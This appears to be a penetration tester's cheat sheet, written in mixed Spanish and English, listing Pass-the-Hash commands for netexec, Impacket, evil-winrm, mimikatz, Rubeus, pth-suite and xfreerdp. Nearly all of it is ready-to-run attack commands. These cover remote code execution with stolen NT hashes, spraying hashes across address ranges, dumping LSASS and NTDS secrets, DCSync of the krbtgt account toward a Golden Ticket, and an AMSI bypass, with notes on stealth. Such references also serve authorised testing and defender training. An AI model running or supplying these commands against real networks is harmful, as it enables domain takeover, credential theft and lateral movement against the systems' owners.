---
aliases:
  - PtH Tooling
  - netexec PtH
  - Impacket PtH
  - Rubeus PtH
tags:
  - type/tool
  - technique/lateral-movement
  - technique/credential-access
  - asset/active-directory
  - cred/ntlm
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Pass-the-Hash]]'
  - '[[netexec]]'
  - '[[Impacket Toolkit]]'
---
# Pass-the-Hash - Tooling

***

## netexec / crackmapexec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <target> -u user -H <NT>` | SMB validate + banner | Pre-attack. |
| `nxc smb <target> -u user -H <NT> -d corp.local` | Domain auth | Standard. |
| `nxc smb <target> -u admin -H <NT> --local-auth` | Local SAM auth | Hash reuse. |
| `nxc smb <range> -u admin -H <NT> --local-auth` | Spray | Hunt reuse. |
| `nxc smb <target> -u user -H <NT> -x '<cmd>'` | RCE via WMI default | Exec. |
| `nxc smb <target> -u user -H <NT> --exec-method smbexec\|wmiexec\|atexec` | Force exec method | Method choice. |
| `nxc winrm <target> -u user -H <NT>` | WinRM auth | Alt path. |
| `nxc rdp <target> -u user -H <NT>` | RDP NLA check | Limited. |
| `nxc smb <target> -u user -H <NT> -M lsassy` | Dump LSASS (cred chain) | Post-pwn. |
| `nxc smb <target> -u user -H <NT> -M comsvcs` | comsvcs.dll MiniDump | Stealth dump. |
^pth-tool-nxc

___

## Impacket

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-psexec -hashes :<NT> corp.local/user@<target>` | SYSTEM shell (drop binary + service) | Loud but reliable. |
| `impacket-wmiexec -hashes :<NT> corp.local/user@<target>` | RCE via WMI (less noisy) | Standard modern. |
| `impacket-smbexec -hashes :<NT> corp.local/user@<target>` | Service create + named pipe (no drop) | Stealth psexec. |
| `impacket-dcomexec -hashes :<NT> -object MMC20 corp.local/user@<target>` | DCOM RCE (max stealth) | DCOM access. |
| `impacket-atexec -hashes :<NT> corp.local/user@<target> '<cmd>'` | Scheduled task RCE | Backup method. |
| `impacket-getTGT corp.local/user -hashes :<NT> -dc-ip <DC>` | Overpass-the-Hash → TGT | Standard overpass. |
| `impacket-secretsdump corp.local/user@<target> -hashes :<NT>` | Remote SAM/LSA/NTDS dump | Cred extraction. |
| `impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM` | Offline NTDS parse | Post-exfil. |
| `impacket-lookupsid 'corp.local/user'@<DC> -hashes :<NT>` | RID brute con hash | Recon. |
^pth-tool-impacket

```bash
# Common pipeline: hash → DCSync → krbtgt
impacket-secretsdump corp.local/atacante@<DC> -hashes :aabbcc... -just-dc

# Output: krbtgt hash → Golden Ticket
```

___

## evil-winrm

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `evil-winrm -i <target> -u user -H <NT>` | WinRM shell PtH | Standard. |
| `evil-winrm -i <target> -u user -H <NT> -P 5986 -S` | LDAPS encrypted | OPSEC. |
| `evil-winrm -i <target> -u user -H <NT> -s ./scripts/ -e ./bin/` | Mount dirs (upload helpers) | Setup. |
| `Bypass-4MSI` (dentro del shell) | AMSI bypass | Pre-payload. |
| `upload <local-file>` / `download <remote>` | File transfer | Standard. |
^pth-tool-evilwinrm

___

## mimikatz

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # privilege::debug` | SeDebugPrivilege | Pre-everything. |
| `mimikatz # sekurlsa::logonpasswords` | Dump LSASS hashes + cleartext | Standard. |
| `mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<NT> /run:cmd.exe` | Inject hash + spawn cmd | On-host PtH. |
| `mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt` | DCSync single user | Targeted. |
| `mimikatz # lsadump::dcsync /domain:corp.local /all /csv` | Bulk DCSync CSV | Reportable. |
| `mimikatz # kerberos::ptt <ticket.kirbi>` | Pass-the-Ticket | Post-overpass. |
| `mimikatz # kerberos::list` | List tickets | Verify. |
| `mimikatz # kerberos::purge` | Clear tickets | Cleanup. |
^pth-tool-mimi

___

## Rubeus

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe asktgt /user:admin /rc4:<NT> /domain:corp.local /ptt` | Overpass-the-Hash | Standard. |
| `Rubeus.exe asktgt /user:admin /aes256:<key> /domain:corp.local /ptt` | AES (OPSEC) | Modern preferred. |
| `Rubeus.exe pth /user:admin /domain:corp.local /ntlm:<NT> /createnetonly:cmd.exe` | PtH inject (alt to Mimikatz) | Modern. |
| `Rubeus.exe ptt /ticket:<base64-or-kirbi>` | Pass-the-Ticket | Standard. |
| `Rubeus.exe klist` | List Kerberos tickets | Verify. |
| `Rubeus.exe purge` | Clear tickets | Cleanup. |
| `Rubeus.exe monitor /interval:5 /targetuser:DC01$` | Live TGT monitor (UD chain) | Live capture. |
^pth-tool-rubeus

___

## pth-suite (Linux Legacy)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `pth-winexe -U 'corp/user%aabbcc...:NTHASH' //<target> cmd.exe` | RCE via winexe + PtH | Legacy. |
| `pth-smbclient -U 'corp/user%aabbcc...:NTHASH' //<target>/C$` | smbclient con PtH | Legacy. |
| `pth-curl -u 'corp/user:aabbcc...:NTHASH' http://<target>/` | HTTP NTLM auth via curl | Edge. |
| `pth-rpcclient -U 'corp/user%aabbcc...:NTHASH' //<target>` | RPC client PtH | Legacy. |
^pth-tool-pthsuite

**Status:** legacy suite (pre-Impacket era). Funciona pero deprecated en favor de nxc/Impacket.

___

## xfreerdp (Linux RDP)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `xfreerdp /v:<target> /u:user /d:corp.local /pth:<NT> /dynamic-resolution` | RDP PtH (RestrictedAdmin) | Standard. |
| `xfreerdp /v:<target> /u:user /d:corp.local /pth:<NT> /smart-sizing /clipboard` | + UX flags | Comfort. |
| `xfreerdp /v:<target> /u:user /d:corp.local /pth:<NT> /cert-ignore` | Ignore TLS cert | Self-signed. |
^pth-tool-xfreerdp

**Caveat:** target requires `DisableRestrictedAdmin = 0` registry. NO funciona out-of-the-box modern.

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| Microsoft — Mitigating PtH | `https://www.microsoft.com/download/details.aspx?id=36036` |
| HackTricks — Pass the Hash | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash` |
| Impacket repo | `https://github.com/fortra/impacket` |
| Rubeus | `https://github.com/GhostPack/Rubeus` |
| Mimikatz | `https://github.com/gentilkiwi/mimikatz` |
| netexec docs | `https://www.netexec.wiki` |
| evil-winrm | `https://github.com/Hackplayers/evil-winrm` |
| The Hacker Recipes — PtH | `https://www.thehacker.recipes/ad/movement/ntlm/pth` |
| MITRE ATT&CK T1550.002 | `https://attack.mitre.org/techniques/T1550/002/` |
^pth-tool-resources

***
